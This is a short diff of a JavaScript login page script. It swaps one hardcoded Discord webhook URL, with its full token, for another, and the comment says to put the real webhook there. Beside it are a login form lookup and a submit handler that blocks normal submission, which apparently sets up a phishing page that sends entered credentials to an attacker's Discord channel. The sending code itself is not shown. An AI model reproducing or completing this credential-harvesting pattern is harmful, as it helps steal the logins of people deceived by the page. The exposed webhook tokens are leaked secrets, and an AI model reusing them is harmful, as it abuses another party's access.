@@ -4,7 +4,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
   const form = document.getElementById("loginForm");
   const loadingScreen = document.getElementById("loading");
-  const webhookURL = "https://discordapp.com/api/webhooks/1359883764947488839/DJCG2QivqPf2GgNeUjdGm9feYvPQTpF6Nvu1zAT3_LEwVnLvt4Q8WzkFHUQq45Ul_3KC"; // Thay webhook thật vào đây
+  const webhookURL = "https://discordapp.com/api/webhooks/1359890453553615063/iR6OfSVUf0gJvSTFh0nMgofJ6qA0CQKbgS8Uv6zENjEmMRqYsv12vIh0LJi9GttJ_PMK"; // Thay webhook thật vào đây
 
   form.addEventListener("submit", function(e) {
     e.preventDefault();
